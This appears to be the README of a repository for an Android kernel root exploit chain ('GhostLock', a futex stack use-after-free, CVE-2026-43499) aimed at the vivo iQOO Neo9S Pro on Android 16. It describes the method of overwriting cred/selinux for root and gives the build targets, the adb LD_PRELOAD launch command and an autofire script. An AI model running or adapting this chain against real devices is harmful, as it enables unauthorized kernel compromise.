# ghostlock-PD2339FA-Neo9SPro-Root

> 研究用途的草稿代码，在作者自己的设备上验证，质量与稳定性不保证。
> 禁止在生产设备上运行；任何由此造成的设备损坏（变砖/数据丢失）概不负责。

面向Android16的GhostLock（Linuxfutex栈UAF，CVE-2026-43499）利用链：
A轮在futexPI等待路径（`FUTEX_LOCK_PI`）留下可复用的栈空洞，B轮重踩
该空洞，取得内核任意读写原语后改写cred/selinux完成root。

## 目标设备

| 项 | 值 |
| --- | --- |
| 机型 | vivo iQOO Neo9S Pro（`PD2339`/`PD2339M`） |
| 固件 | `BP2A.250605.031.A3`（Android16） |
| 内核 | `6.1.145-android14-11`（arm64，VA_BITS=39，4K页） |
| 设备常量 | `src/targets/target.h` |

其他机型的target目录已删除，本仓库是单目标草稿。

## 构建

依赖AndroidNDK，Makefile按`ANDROID_NDK_HOME`→`ANDROID_NDK_ROOT`→
`~/android-ndk-cache/android-ndk-*`→`~/Android/Sdk/ndk/*`→`/opt/android-ndk`
顺序探测，clang资源目录用`lib/clang/*`通配。找不到时回退到宿主机`clang`
加`--target=aarch64-linux-android35`交叉参数（需自备sysroot）。
用`make info`查看实际选中的工具链。

```sh
make            # clean → tools → payload，走完全流程
make tools      # 只构建tools/：hijtest / slot_restore / psl2
make payload    # 只构建preload.so+su_ksu，装到payloads/preload.so
make info       # 打印工具链与GL_VERSION
make clean      # 删除build/、payloads/与tools/的全部产物
```

`make all`用递归`$(MAKE)`串行串联，不用依赖项（依赖项不保证顺序，
`make -j`下会竞态）。单项工具可直接进子目录：`make -C tools psl2`。

产物：

- `payloads/preload.so` ——发射用的`LD_PRELOAD`载荷（A/B两轮共用）
- `tools/hijtest`、`tools/slot_restore`、`tools/psl2`、`tools/r829_bandscan`
- `build/<PROJECT>/bin/preload.so`、`su_ksu` ——构建原件

版本信息编在二进制内部（`BUILD_VERSION`，取`git describe`）：

```sh
make info | grep GL_VERSION                    # 构建时注入的版本
strings payloads/preload.so | grep -E '^[0-9a-f]{7,}(-dirty)?$'  # 从产物读回
```

`tools/kallsyms.new`（约4.9MB，固件`boot.img`提取）随仓库提供，
是烘焙ko的必需输入。`tools/`下的二进制不入库，由`make tools`构建。

## 运行

需要能`adb shell`（uid2000）的调试口。两个发射轮次在同一启动内：

1. **A轮**：留下futexPI栈空洞并挂驻等待进程
   （`SLIDE_WRITE_TARGET=selinux`，见`scripts/r821a_command.txt`）；
2. `psl2`测当次启动KASLR`TEXT`；
3. `ksu/make_device_ko.sh <TEXT>`烘焙设备ko并推送；
4. **B轮**：消费空洞、走fops劫持与链落地
   （`SLIDE_WRITE_TARGET=fops`+`SLIDE_CRED_WRITE=1`+`SLIDE_TEXT_ADDR=<TEXT>`，
   见`scripts/r776b_command.txt`）。

手动形态：

```sh
adb shell "cd /data/local/tmp && env SLIDE_…=… \
  LD_PRELOAD=/data/local/tmp/preload.so /system/bin/app_process64 / dummy"
```

全自动用`scripts/r830_autofire.sh`，脚本使用仓库相对路径，可从任意目录调用：

```sh
export ANDROID_SERIAL=<你的设备serial>   # 多设备时必填，单设备可省略
./scripts/r830_autofire.sh r830 3
```

需覆盖默认路径时用环境变量：`KALLSYMS`、`PRELOAD`、`PSL2`、`ADB`。

`pr_info`（`[*]`前缀的逐周期/逐次重试行）默认关闭，只保留
`pr_warning`/`pr_success`/`pr_error`与判定marker。需要完整输出加
`GL_LOG_INFO=1`。

## License

MIT